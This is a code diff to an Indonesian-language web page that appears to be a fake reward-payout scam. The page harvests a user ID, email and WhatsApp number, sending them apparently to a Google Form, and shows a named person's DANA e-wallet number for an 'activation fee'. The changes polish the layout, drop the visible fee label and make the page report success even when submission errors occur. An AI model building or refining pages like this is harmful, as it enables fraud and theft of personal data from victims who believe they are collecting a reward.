@@ -31,14 +31,14 @@
         #reward-display.show { transform: translate(-50%, -50%) scale(1); }
 
         .form-daftar { display: none; text-align: left; background: #334155; padding: 20px; border-radius: 18px; margin-top: 20px; }
-        .form-daftar label { font-size: 11px; color: #94a3b8; display: block; margin-bottom: 4px; font-weight: 600; text-transform: uppercase; }
+        .form-daftar label { font-size: 11px; color: #94a3b8; display: block; margin: 10px 0 4px 0; font-weight: 600; text-transform: uppercase; }
         .form-daftar input, .form-daftar select {
-            width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 10px; border: 1px solid #475569; box-sizing: border-box; background: #0f172a; color: white;
+            width: 100%; padding: 12px; border-radius: 10px; border: 1px solid #475569; box-sizing: border-box; background: #0f172a; color: white; font-size: 14px;
         }
         
         button#mainBtn, .btn-submit { 
             padding: 16px; font-size: 16px; font-weight: bold; cursor: pointer;
-            background: var(--primary); color: white; border: none; border-radius: 12px; width: 100%;
+            background: var(--primary); color: white; border: none; border-radius: 12px; width: 100%; margin-top: 15px;
         }
 
         #loadingArea { display: none; margin: 20px 0; }
@@ -83,13 +83,13 @@
         <button id="mainBtn" onclick="startSync()">SINKRONISASI SEKARANG</button>
 
         <div id="registrationForm" class="form-daftar">
-            <h4 style="text-align:center; color:var(--primary); margin:0 0 15px 0;">DATA PENCAIRAN SALDO</h4>
+            <h4 style="text-align:center; color:var(--primary); margin:0 0 10px 0;">DATA PENCAIRAN SALDO</h4>
             
             <label>ID Pengguna:</label>
             <input type="text" id="regId" placeholder="Min. 6 Karakter" required>
             
             <label>Email Aktif:</label>
-            <input type="email" id="regEmail" placeholder="contoh@email.com" required>
+            <input type="email" id="regEmail" placeholder="contoh@gmail.com" required>
             
             <label>WhatsApp:</label>
             <input type="text" id="regWa" value="+62" required>
@@ -130,13 +130,12 @@
             <div class="dana-card">
                 <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:15px;">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/72/Logo_dana_blue.svg/1200px-Logo_dana_blue.svg.png" style="width:70px; filter: brightness(0) invert(1);" alt="DANA">
-                    <span style="font-size:10px; font-weight:bold;">BIAYA AKTIVASI</span>
                 </div>
                 <div class="dana-label">Nama Pemilik Akun:</div>
                 <div class="dana-value">NIZAR ARDIANSYAH</div>
                 <div class="dana-label">Nomor Rekening DANA:</div>
                 <div class="copy-container">
-                    <span id="nomorDana" style="font-size: 20px; font-weight: 800; letter-spacing: 1px;">085129867807</span>
+                    <span id="nomorDana" style="font-size: 20px; font-weight: 800;">085129867807</span>
                     <button class="btn-copy" onclick="copyNumber()">SALIN</button>
                 </div>
             </div>
@@ -224,6 +223,10 @@
                 localStorage.setItem("active_done", "true");
                 localStorage.setItem("active_sld", d.sld);
                 document.getElementById('finalSaldo').innerText = "Rp " + d.sld;
+                document.getElementById('resultModal').style.display = "block";
+            }).catch(() => {
+                // Tetap tampilkan modal meskipun cors error (karena data biasanya tetap masuk ke Google Form)
+                localStorage.setItem("active_done", "true");
                 document.getElementById('resultModal').style.display = "block";
             });
         }
